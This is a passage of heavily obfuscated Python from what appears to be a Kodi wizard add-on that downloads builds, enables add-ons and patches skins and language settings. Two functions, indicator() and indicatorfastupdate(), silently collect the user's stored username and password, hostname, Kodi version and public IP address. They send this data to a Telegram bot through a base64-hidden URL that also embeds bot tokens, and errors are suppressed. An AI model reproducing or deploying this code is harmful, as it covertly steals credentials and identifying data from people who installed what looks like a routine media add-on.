        O0000000O0O0O0O0O =OOOO00OO0O0OOO000 /(1024 *1024 )#line:3479
        O000O00OO00O0000O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOO0O00OO00O0OO00 ,'teal',O0000000O0O0O0O0O )#line:3480
        if (time .time ()-OO000O0OO0O0OOO00 )>0 :#line:3481
          OO00000OOOOO000OO =O0OO00OO00OOO0OOO /(time .time ()-OO000O0OO0O0OOO00 )#line:3482
          OO00000OOOOO000OO =OO00000OOOOO000OO /1024 #line:3483
        else :#line:3484
         OO00000OOOOO000OO =0 #line:3485
        O000OOO0OO0OOO000 ='KB'#line:3486
        if OO00000OOOOO000OO >=1024 :#line:3487
           OO00000OOOOO000OO =OO00000OOOOO000OO /1024 #line:3488
           O000OOO0OO0OOO000 ='MB'#line:3489
        if OO00000OOOOO000OO >0 and not O00OO0OOOOOO000OO ==100 :#line:3490
            OOO0O00OO000OOO0O =(OOOO00OO0O0OOO000 -O0OO00OO00OOO0OOO )/OO00000OOOOO000OO #line:3491
        else :#line:3492
            OOO0O00OO000OOO0O =0 #line:3493
        O000000OO0000000O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO00000OOOOO000OO ,O000OOO0OO0OOO000 )#line:3494
        OO00OO00OOO0O00O0 .update (int (O00OO0OOOOOO000OO ),"Downloading "+name ,O000O00OO00O0000O ,O000000OO0000000O )#line:3496
  O0O0OOOOO00OOO00O =xbmc .translatePath (os .path .join ('special://home','addons'))#line:3499
  OO00O0O0O0OOO0O0O .close ()#line:3501
  extract (OOOO00OOOOO00000O ,O0O0OOOOO00OOO00O ,OO00OO00OOO0O00O0 )#line:3503
  if os .path .exists (O0O0OOOOO00OOO00O +'/scakemyer-script.quasar.burst'):#line:3504
    if os .path .exists (O0O0OOOOO00OOO00O +'/script.quasar.burst'):#line:3505
     shutil .rmtree (O0O0OOOOO00OOO00O +'/script.quasar.burst',ignore_errors =False )#line:3506
    os .rename (O0O0OOOOO00OOO00O +'/scakemyer-script.quasar.burst',O0O0OOOOO00OOO00O +'/script.quasar.burst')#line:3507
  if os .path .exists (O0O0OOOOO00OOO00O +'/plugin.video.kmediatorrent-master'):#line:3509
    if os .path .exists (O0O0OOOOO00OOO00O +'/plugin.video.kmediatorrent'):#line:3510
     shutil .rmtree (O0O0OOOOO00OOO00O +'/plugin.video.kmediatorrent',ignore_errors =False )#line:3511
    os .rename (O0O0OOOOO00OOO00O +'/plugin.video.kmediatorrent-master',O0O0OOOOO00OOO00O +'/plugin.video.kmediatorrent')#line:3512
  xbmc .executebuiltin ('UpdateLocalAddons ')#line:3513
  xbmc .executebuiltin ("UpdateAddonRepos")#line:3514
  try :#line:3515
    os .remove (OOOO00OOOOO00000O )#line:3516
  except :#line:3517
    pass #line:3518
  OO00OO00OOO0O00O0 .close ()#line:3519
def dis_or_enable_addon (O0O00OO00OO0O0000 ,OOO0000O00O00OO00 ,enable ="true"):#line:3520
    import json #line:3521
    O0OOO000O00O00000 ='"%s"'%O0O00OO00OO0O0000 #line:3522
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%O0O00OO00OO0O0000 )and enable =="true":#line:3523
        logging .warning ('already Enabled')#line:3524
        return xbmc .log ("### Skipped %s, reason = allready enabled"%O0O00OO00OO0O0000 )#line:3525
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%O0O00OO00OO0O0000 )and enable =="false":#line:3526
        return xbmc .log ("### Skipped %s, reason = not installed"%O0O00OO00OO0O0000 )#line:3527
    else :#line:3528
        O0OO000OO00OOOO00 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(O0OOO000O00O00000 ,enable )#line:3529
        O0000OO0000OOOO00 =xbmc .executeJSONRPC (O0OO000OO00OOOO00 )#line:3530
        O00OOOOO0O0OOOO0O =json .loads (O0000OO0000OOOO00 )#line:3531
        if enable =="true":#line:3532
            xbmc .log ("### Enabled %s, response = %s"%(O0O00OO00OO0O0000 ,O00OOOOO0O0OOOO0O ))#line:3533
        else :#line:3534
            xbmc .log ("### Disabled %s, response = %s"%(O0O00OO00OO0O0000 ,O00OOOOO0O0OOOO0O ))#line:3535
    if OOO0000O00O00OO00 =='auto':#line:3536
     return True #line:3537
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:3538
def chunk_report (OOOO0000OO0O0O00O ,OOOO00O0000OOO000 ,OOOO000O00OOO000O ):#line:3539
   O00O0OOOOO00OO0O0 =float (OOOO0000OO0O0O00O )/OOOO000O00OOO000O #line:3540
   O00O0OOOOO00OO0O0 =round (O00O0OOOOO00OO0O0 *100 ,2 )#line:3541
   if OOOO0000OO0O0O00O >=OOOO000O00OOO000O :#line:3543
      sys .stdout .write ('\n')#line:3544
def chunk_read (OOO0O0OOO00OOOO00 ,chunk_size =8192 ,report_hook =None ,dp =None ,destination ='',filesize =1000000 ):#line:3546
   import time #line:3547
   OOOOOOOO0O0OOOO00 =int (filesize )*1000000 #line:3548
   OOOO00O00O0O0O0O0 =0 #line:3550
   O000000000O000OO0 =time .time ()#line:3551
   O00O0O00O00000O00 =0 #line:3552
   logging .warning ('Downloading')#line:3554
   with open (destination ,"wb")as OOOO0OOOOO0O0O00O :#line:3555
    while 1 :#line:3556
      OO0OOO0O0OOO0O000 =time .time ()-O000000000O000OO0 #line:3557
      O00O0O000OO0O000O =int (O00O0O00O00000O00 *chunk_size )#line:3558
      OO0000O00O00OOOO0 =OOO0O0OOO00OOOO00 .read (chunk_size )#line:3559
      OOOO0OOOOO0O0O00O .write (OO0000O00O00OOOO0 )#line:3560
      OOOO0OOOOO0O0O00O .flush ()#line:3561
      OOOO00O00O0O0O0O0 +=len (OO0000O00O00OOOO0 )#line:3562
      O0OOO0OO000O0OOOO =float (OOOO00O00O0O0O0O0 )/OOOOOOOO0O0OOOO00 #line:3563
      O0OOO0OO000O0OOOO =round (O0OOO0OO000O0OOOO *100 ,2 )#line:3564
      if int (OO0OOO0O0OOO0O000 )>0 :#line:3565
        OOO0OOOO0O000OO0O =int (O00O0O000OO0O000O /(1024 *OO0OOO0O0OOO0O000 ))#line:3566
      else :#line:3567
         OOO0OOOO0O000OO0O =0 #line:3568
      if OOO0OOOO0O000OO0O >1024 and not O0OOO0OO000O0OOOO ==100 :#line:3569
          O0000O0O00O00OO00 =int (((OOOOOOOO0O0OOOO00 -O00O0O000OO0O000O )/1024 )/(OOO0OOOO0O000OO0O ))#line:3570
      else :#line:3571
          O0000O0O00O00OO00 =0 #line:3572
      if O0000O0O00O00OO00 <0 :#line:3573
        O0000O0O00O00OO00 =0 #line:3574
      dp .update (int (O0OOO0OO000O0OOOO ),name +"[B]מוריד: [/B]","\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(O0OOO0OO000O0OOOO ,O00O0O000OO0O000O /(1024 *1024 ),OOOOOOOO0O0OOOO00 /(1000 *1000 ),OOO0OOOO0O000OO0O ),'[COLOR aqua]%02d:%02d[/COLOR][B]זמן שנותר: [/B]'%divmod (O0000O0O00O00OO00 ,60 ))#line:3575
      if dp .iscanceled ():#line:3576
         dp .close ()#line:3577
         break #line:3578
      if not OO0000O00O00OOOO0 :#line:3579
         break #line:3580
      if report_hook :#line:3582
         report_hook (OOOO00O00O0O0O0O0 ,chunk_size ,OOOOOOOO0O0OOOO00 )#line:3583
      O00O0O00O00000O00 +=1 #line:3584
   logging .warning ('END Downloading')#line:3585
   return OOOO00O00O0O0O0O0 #line:3586
def googledrive_download (OO0OO0OOOOO00O0O0 ,O0OO0O0OOOO0000OO ,OOOO0OOOOOO00O00O ,OOO0OO0O00O0O0OOO ):#line:3588
    OO000O0000000OOOO =[]#line:3592
    OO0O00OO0000O00OO =OO0OO0OOOOO00O0O0 .split ('=')#line:3593
    OO0OO0OOOOO00O0O0 =OO0O00OO0000O00OO [len (OO0O00OO0000O00OO )-1 ]#line:3594
    def O00O00O000O00O000 (OO00OOO0OOOO0O0OO ):#line:3596
        for O0OO0O00OOOOO0O0O in OO00OOO0OOOO0O0OO :#line:3598
            logging .warning ('cookie.name')#line:3599
            logging .warning (O0OO0O00OOOOO0O0O .name )#line:3600
            OO0OO0000OOO0OO0O =O0OO0O00OOOOO0O0O .value #line:3601
            if 'download_warning'in O0OO0O00OOOOO0O0O .name :#line:3602
                logging .warning (O0OO0O00OOOOO0O0O .value )#line:3603
                logging .warning ('cookie.value')#line:3604
                return O0OO0O00OOOOO0O0O .value #line:3605
            return OO0OO0000OOO0OO0O #line:3606
        return None #line:3608
    def OOO00000O0O0O0O00 (OO0OOO0O000O00OOO ,O0O00O00OOO0O00OO ):#line:3610
        O00O00000O00000OO =32768 #line:3612
        O000O0OO00OO00O0O =time .time ()#line:3613
        with open (O0O00O00OOO0O00OO ,"wb")as OOOOOOO0OO0O0O00O :#line:3615
            O00OO00OOOOOOOO00 =1 #line:3616
            OO000OOO00O0O00OO =32768 #line:3617
            try :#line:3618
                O0000OOO0O0O0O000 =int (OO0OOO0O000O00OOO .headers .get ('content-length'))#line:3619
                print ('file total size :',O0000OOO0O0O0O000 )#line:3620
            except TypeError :#line:3621
                print ('using dummy length !!!')#line:3622
                O0000OOO0O0O0O000 =int (OOO0OO0O00O0O0OOO )*1000000 #line:3623
            for O0000O0OOOO0OOOO0 in OO0OOO0O000O00OOO .iter_content (O00O00000O00000OO ):#line:3624
                if O0000O0OOOO0OOOO0 :#line:3625
                    OOOOOOO0OO0O0O00O .write (O0000O0OOOO0OOOO0 )#line:3626
                    OOOOOOO0OO0O0O00O .flush ()#line:3627
                    O0O0000O00OOOO00O =time .time ()-O000O0OO00OO00O0O #line:3628
                    OOO0OO0000O0OO0OO =int (O00OO00OOOOOOOO00 *OO000OOO00O0O00OO )#line:3629
                    if O0O0000O00OOOO00O ==0 :#line:3630
                        O0O0000O00OOOO00O =0.1 #line:3631
                    O00O0OOO0000O0000 =int (OOO0OO0000O0OO0OO /(1024 *O0O0000O00OOOO00O ))#line:3632
                    O000000O0O0O0O000 =int (O00OO00OOOOOOOO00 *OO000OOO00O0O00OO *100 /O0000OOO0O0O0O000 )#line:3633
                    if O00O0OOO0000O0000 >1024 and not O000000O0O0O0O000 ==100 :#line:3634
                      O0O0000OO0OO00OOO =int (((O0000OOO0O0O0O000 -OOO0OO0000O0OO0OO )/1024 )/(O00O0OOO0000O0000 ))#line:3635
                    else :#line:3636
                      O0O0000OO0OO00OOO =0 #line:3637
                    OOOO0OOOOOO00O00O .update (int (O000000O0O0O0O000 ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(O000000O0O0O0O000 ,OOO0OO0000O0OO0OO /(1024 *1024 ),O0000OOO0O0O0O000 /(1000 *1000 ),O00O0OOO0000O0000 ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (O0O0000OO0OO00OOO ,60 ))#line:3639
                    O00OO00OOOOOOOO00 +=1 #line:3640
                    if OOOO0OOOOOO00O00O .iscanceled ():#line:3641
                     OOOO0OOOOOO00O00O .close ()#line:3642
                     break #line:3643
    OOOOOOO00O0OOO0OO ="https://docs.google.com/uc?export=download"#line:3644
    import urllib2 #line:3649
    import cookielib #line:3650
    from cookielib import CookieJar #line:3652
    O0OO000O0O000OOOO =CookieJar ()#line:3654
    O00OO0OO0O0000OOO =urllib2 .build_opener (urllib2 .HTTPCookieProcessor (O0OO000O0O000OOOO ))#line:3655
    OOO0OOOOOOO0OOO00 ={'id':OO0OO0OOOOO00O0O0 }#line:3657
    O0O000O000O0O0OOO =urllib .urlencode (OOO0OOOOOOO0OOO00 )#line:3658
    logging .warning (OOOOOOO00O0OOO0OO +'&'+O0O000O000O0O0OOO )#line:3659
    OO0OOOO00OO0O0O0O =O00OO0OO0O0000OOO .open (OOOOOOO00O0OOO0OO +'&'+O0O000O000O0O0OOO )#line:3660
    OOO0O0O0000OO000O =OO0OOOO00OO0O0O0O .read ()#line:3661
    for OO0000O00O0O0OOO0 in O0OO000O0O000OOOO :#line:3663
         logging .warning (OO0000O00O0O0OOO0 )#line:3664
    O00OOOO0000O00O0O =O00O00O000O00O000 (O0OO000O0O000OOOO )#line:3665
    logging .warning (O00OOOO0000O00O0O )#line:3666
    if O00OOOO0000O00O0O :#line:3667
        O000OOO0000O00O00 ={'id':OO0OO0OOOOO00O0O0 ,'confirm':O00OOOO0000O00O0O }#line:3668
        O00O0O0O0O0000O00 ={'Access-Control-Allow-Headers':'Content-Length'}#line:3669
        O0O000O000O0O0OOO =urllib .urlencode (O000OOO0000O00O00 )#line:3670
        OO0OOOO00OO0O0O0O =O00OO0OO0O0000OOO .open (OOOOOOO00O0OOO0OO +'&'+O0O000O000O0O0OOO )#line:3671
        chunk_read (OO0OOOO00OO0O0O0O ,report_hook =chunk_report ,dp =OOOO0OOOOOO00O00O ,destination =O0OO0O0OOOO0000OO ,filesize =OOO0OO0O00O0O0OOO )#line:3672
    return (OO000O0000000OOOO )#line:3676
def kodi17Fix ():#line:3677
	OO0OOOO0000OO000O =glob .glob (os .path .join (ADDONS ,'*/'))#line:3678
	O0000OOOOOOO0O0O0 =[]#line:3679
	for OO0O0OOOOO0OO0O0O in sorted (OO0OOOO0000OO000O ,key =lambda OO000OO0OO000O0O0 :OO000OO0OO000O0O0 ):#line:3680
		OOO0O0OO0000O00OO =os .path .join (OO0O0OOOOO0OO0O0O ,'addon.xml')#line:3681
		if os .path .exists (OOO0O0OO0000O00OO ):#line:3682
			O0OO0OO000O000OOO =OO0O0OOOOO0OO0O0O .replace (ADDONS ,'')[1 :-1 ]#line:3683
			O0O0O0OO0000O0OOO =open (OOO0O0OO0000O00OO )#line:3684
			O00O0O0OO0O0OOO0O =O0O0O0OO0000O0OOO .read ()#line:3685
			OO0O00OO000O00000 =parseDOM (O00O0O0OO0O0OOO0O ,'addon',ret ='id')#line:3686
			O0O0O0OO0000O0OOO .close ()#line:3687
			try :#line:3688
				O0000O000OO0OOO00 =xbmcaddon .Addon (id =OO0O00OO000O00000 [0 ])#line:3689
			except :#line:3690
				try :#line:3691
					log ("%s was disabled"%OO0O00OO000O00000 [0 ],xbmc .LOGDEBUG )#line:3692
					O0000OOOOOOO0O0O0 .append (OO0O00OO000O00000 [0 ])#line:3693
				except :#line:3694
					try :#line:3695
						log ("%s was disabled"%O0OO0OO000O000OOO ,xbmc .LOGDEBUG )#line:3696
						O0000OOOOOOO0O0O0 .append (O0OO0OO000O000OOO )#line:3697
					except :#line:3698
						if len (OO0O00OO000O00000 )==0 :log ("Unabled to enable: %s(Cannot Determine Addon ID)"%O0OO0OO000O000OOO ,xbmc .LOGERROR )#line:3699
						else :log ("Unabled to enable: %s"%OO0O0OOOOO0OO0O0O ,xbmc .LOGERROR )#line:3700
	if len (O0000OOOOOOO0O0O0 )>0 :#line:3701
		OO0O000O0O0OOOOOO =0 #line:3702
		DP .create (ADDONTITLE ,'[COLOR %s]Enabling disabled Addons'%COLOR2 ,'','Please Wait[/COLOR]')#line:3703
		for OOOOOOOO00OO0O000 in O0000OOOOOOO0O0O0 :#line:3704
			OO0O000O0O0OOOOOO +=1 #line:3705
			O0O0O00O0O0O00OO0 =int (percentage (OO0O000O0O0OOOOOO ,len (O0000OOOOOOO0O0O0 )))#line:3706
			DP .update (O0O0O00O0O0O00OO0 ,"","Enabling: [COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOOOOOO00OO0O000 ))#line:3707
			addonDatabase (OOOOOOOO00OO0O000 ,1 )#line:3708
			if DP .iscanceled ():break #line:3709
		if DP .iscanceled ():#line:3710
			DP .close ()#line:3711
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Enabling Addons Cancelled![/COLOR]"%COLOR2 )#line:3712
			sys .exit ()#line:3713
		DP .close ()#line:3714
	forceUpdate ()#line:3715
def indicator ():#line:3717
       try :#line:3718
          import json #line:3719
          wiz .log ('FRESH MESSAGE')#line:3720
          O00O0O0000000O0OO =(ADDON .getSetting ("user"))#line:3721
          OO0O0OOO0OO0O000O =(ADDON .getSetting ("pass"))#line:3722
          OOO0O0O000O0OOOOO =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3723
          OOOO00OO0OO0OO000 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDc1MDEwMDI1NjpBQUVJVnpTSndOM2t6T25EV0F3Yi1LTkk3VUREY2N6aEx6VS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNDE1ODcxNzk3JnRleHQ915TXqten15nXnyDXkNeqINeU15HXmdec15Mg16nXnNeaIA=='#line:3724
          OOOOOOO00O0OOO00O =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3725
          OO0OO0OO0O0OO0OO0 =str (json .loads (OOOOOOO00O0OOO00O )['ip'])#line:3726
          O000OOO00O00OOO0O =O00O0O0000000O0OO #line:3727
          OO000OO00OO0O00OO =OO0O0OOO0OO0O000O #line:3728
          import socket #line:3729
          OOOOOOO00O0OOO00O =urllib2 .urlopen (OOOO00OO0OO0OO000 .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+O000OOO00O00OOO0O +' - '+OO000OO00OO0O00OO +' - '+OOO0O0O000O0OOOOO +' - '+OO0OO0OO0O0OO0OO0 ).readlines ()#line:3730
       except :pass #line:3732
def indicatorfastupdate ():#line:3734
       try :#line:3735
          import json #line:3736
          wiz .log ('FRESH MESSAGE')#line:3737
          OO0OOOOO0O00O0OOO =(ADDON .getSetting ("user"))#line:3738
          O0OOO0OOOOO00O000 =(ADDON .getSetting ("pass"))#line:3739
          O00OO0O0O0OOO00OO =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3740
          OOO000O00O000O0O0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0g16LXqdeUINei15PXm9eV158g157XlNeZ16gg'#line:3742
          OOO000OO0O0OO0O0O =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3743
          OO0O0O0O00OOO0O0O =str (json .loads (OOO000OO0O0OO0O0O )['ip'])#line:3744
          OO00O0OOOOOOO0OO0 =OO0OOOOO0O00O0OOO #line:3745
          O00000O00O00O00OO =O0OOO0OOOOO00O000 #line:3746
          import socket #line:3748
          OOO000OO0O0OO0O0O =urllib2 .urlopen (OOO000O00O000O0O0 .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+OO00O0OOOOOOO0OO0 +' - '+O00000O00O00O00OO +' - '+O00OO0O0O0OOO00OO +' - '+OO0O0O0O00OOO0O0O ).readlines ()#line:3749
       except :pass #line:3751
def skinfix18 ():#line:3753
	if KODIV >=18 and os .path .exists (os .path .join (ADDONS ,SKINID18 )):#line:3754
		OO00O00OOOO00O0OO =wiz .workingURL (SKINID18DDONXML )#line:3755
		if OO00O00OOOO00O0OO ==True :#line:3756
			OOOO0OOO000OOO0O0 =wiz .parseDOM (wiz .openURL (SKINID18DDONXML ),'addon',ret ='version',attrs ={'id':SKINID18 })#line:3757
			if len (OOOO0OOO000OOO0O0 )>0 :#line:3758
				O0O0OOOOOO00O0OO0 ='%s-%s.zip'%(SKINID18 ,OOOO0OOO000OOO0O0 [0 ])#line:3759
				O00O00O00O0000000 =wiz .workingURL (SKIN18ZIPURL +O0O0OOOOOO00O0OO0 )#line:3760
				if O00O00O00O0000000 ==True :#line:3761
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3762
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3763
					OOO000OO0OOOO0O00 =os .path .join (PACKAGES ,O0O0OOOOOO00O0OO0 )#line:3764
					try :os .remove (OOO000OO0OOOO0O00 )#line:3765
					except :pass #line:3766
					downloader .download (SKIN18ZIPURL +O0O0OOOOOO00O0OO0 ,OOO000OO0OOOO0O00 ,DP )#line:3767
					extract .all (OOO000OO0OOOO0O00 ,HOME ,DP )#line:3768
					try :#line:3769
						OO0OOO0O00O0O00O0 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3770
						O000OO000O0000O00 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3771
						os .rename (OO0OOO0O00O0O00O0 ,O000OO000O0000O00 )#line:3772
					except :#line:3773
						pass #line:3774
					try :#line:3775
						O00OO000OO0000O00 =open (os .path .join (ADDONS ,SKINID18 ,'addon.xml'),mode ='r');OO0O00OO0O00OO0OO =O00OO000OO0000O00 .read ();O00OO000OO0000O00 .close ()#line:3776
						OOO000OO0OOO00O0O =wiz .parseDOM (OO0O00OO0O00OO0OO ,'addon',ret ='name',attrs ={'id':SKINID18 })#line:3777
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO000OO0OOO00O0O [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID18 ,'icon.png'))#line:3778
					except :#line:3779
						pass #line:3780
					if KODIV >=17 :wiz .addonDatabase (SKINID18 ,1 )#line:3781
					DP .close ()#line:3782
					xbmc .sleep (500 )#line:3783
					wiz .forceUpdate (True )#line:3784
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3785
				else :#line:3786
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3787
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%O00O00O00O0000000 ,xbmc .LOGERROR )#line:3788
			else :#line:3789
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3790
		else :#line:3791
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3792
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3793
def skinfix17 ():#line:3794
	if KODIV >=17 and KODIV <18 and os .path .exists (os .path .join (ADDONS ,SKINID17 )):#line:3795
		OO0000OO00OOOOOO0 =wiz .workingURL (SKINID17DDONXML )#line:3796
		if OO0000OO00OOOOOO0 ==True :#line:3797
			O00000000OO0O00O0 =wiz .parseDOM (wiz .openURL (SKINID17DDONXML ),'addon',ret ='version',attrs ={'id':SKINID17 })#line:3798
			if len (O00000000OO0O00O0 )>0 :#line:3799
				OO0OOOOOOOO000OOO ='%s-%s.zip'%(SKINID17 ,O00000000OO0O00O0 [0 ])#line:3800
				O00OO0O0OOO0O0O00 =wiz .workingURL (SKIN17ZIPURL +OO0OOOOOOOO000OOO )#line:3801
				if O00OO0O0OOO0O0O00 ==True :#line:3802
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3803
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3804
					O0OO0OOO0O00O000O =os .path .join (PACKAGES ,OO0OOOOOOOO000OOO )#line:3805
					try :os .remove (O0OO0OOO0O00O000O )#line:3806
					except :pass #line:3807
					downloader .download (SKIN17ZIPURL +OO0OOOOOOOO000OOO ,O0OO0OOO0O00O000O ,DP )#line:3808
					extract .all (O0OO0OOO0O00O000O ,HOME ,DP )#line:3809
					try :#line:3810
						O0OO00OO00O000OO0 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3811
						O0O00O0O0OO0000OO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3812
						os .rename (O0OO00OO00O000OO0 ,O0O00O0O0OO0000OO )#line:3813
					except :#line:3814
						pass #line:3815
					try :#line:3816
						O0OO0O00OOO0OOOOO =open (os .path .join (ADDONS ,SKINID17 ,'addon.xml'),mode ='r');OO00O0O0OOOO00O00 =O0OO0O00OOO0OOOOO .read ();O0OO0O00OOO0OOOOO .close ()#line:3817
						O0OOOOOOO00O0OOO0 =wiz .parseDOM (OO00O0O0OOOO00O00 ,'addon',ret ='name',attrs ={'id':SKINID17 })#line:3818
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OOOOOOO00O0OOO0 [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID17 ,'icon.png'))#line:3819
					except :#line:3820
						pass #line:3821
					if KODIV >=17 :wiz .addonDatabase (SKINID17 ,1 )#line:3822
					DP .close ()#line:3823
					xbmc .sleep (500 )#line:3824
					wiz .forceUpdate (True )#line:3825
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3826
				else :#line:3827
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3828
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%O00OO0O0OOO0O0O00 ,xbmc .LOGERROR )#line:3829
			else :#line:3830
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3831
		else :#line:3832
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3833
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3834
def fix17update ():#line:3835
	if KODIV >=17 and KODIV <18 :#line:3836
		wiz .kodi17Fix ()#line:3837
		xbmc .sleep (4000 )#line:3838
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3839
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3840
		fixfont ()#line:3841
		O0O0O0O00OOO00O0O =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3842
		try :#line:3844
			O0O0OOOO0OO000OO0 =open (O0O0O0O00OOO00O0O ,'r')#line:3845
			O00O0O000OO0OOO00 =O0O0OOOO0OO000OO0 .read ()#line:3846
			O0O0OOOO0OO000OO0 .close ()#line:3847
			O000OOO0OOO000000 ='<import addon="xbmc.gui" version="5.14.0(.+?)/>'#line:3848
			O000O0O00O0000OOO =re .compile (O000OOO0OOO000000 ).findall (O00O0O000OO0OOO00 )[0 ]#line:3849
			O0O0OOOO0OO000OO0 =open (O0O0O0O00OOO00O0O ,'w')#line:3850
			O0O0OOOO0OO000OO0 .write (O00O0O000OO0OOO00 .replace ('<import addon="xbmc.gui" version="5.14.0%s/>'%O000O0O00O0000OOO ,'<import addon="xbmc.gui" version="5.12.0"/>'))#line:3851
			O0O0OOOO0OO000OO0 .close ()#line:3852
		except :#line:3853
				pass #line:3854
		wiz .kodi17Fix ()#line:3855
		O0O0O0O00OOO00O0O =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3856
		try :#line:3857
			O0O0OOOO0OO000OO0 =open (O0O0O0O00OOO00O0O ,'r')#line:3858
			O00O0O000OO0OOO00 =O0O0OOOO0OO000OO0 .read ()#line:3859
			O0O0OOOO0OO000OO0 .close ()#line:3860
			O000OOO0OOO000000 ='<keyboardlayouts default="true(.+?)/keyboardlayouts>'#line:3861
			O000O0O00O0000OOO =re .compile (O000OOO0OOO000000 ).findall (O00O0O000OO0OOO00 )[0 ]#line:3862
			O0O0OOOO0OO000OO0 =open (O0O0O0O00OOO00O0O ,'w')#line:3863
			O0O0OOOO0OO000OO0 .write (O00O0O000OO0OOO00 .replace ('<keyboardlayouts default="true%s/keyboardlayouts>'%O000O0O00O0000OOO ,'<keyboardlayouts>English QWERTY|Hebrew QWERTY</keyboardlayouts>'))#line:3864
			O0O0OOOO0OO000OO0 .close ()#line:3865
		except :#line:3866
				pass #line:3867
		swapSkins ('skin.Premium.mod')#line:3868
def fix18update ():#line:3870
	if KODIV >=18 :#line:3871
		xbmc .sleep (4000 )#line:3872
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3873
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3874
		fixfont ()#line:3875
		OO000OO000OO00OO0 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3876
		try :#line:3877
			OO000O0OO0O00O0O0 =open (OO000OO000OO00OO0 ,'r')#line:3878
			OO00O0O00O0O00O0O =OO000O0OO0O00O0O0 .read ()#line:3879
			OO000O0OO0O00O0O0 .close ()#line:3880
			O0OOO000O0OOO0O00 ='<import addon="xbmc.gui" version="5.12.0(.+?)/>'#line:3881
			OO0OOOOO0OOO00000 =re .compile (O0OOO000O0OOO0O00 ).findall (OO00O0O00O0O00O0O )[0 ]#line:3882
			OO000O0OO0O00O0O0 =open (OO000OO000OO00OO0 ,'w')#line:3883
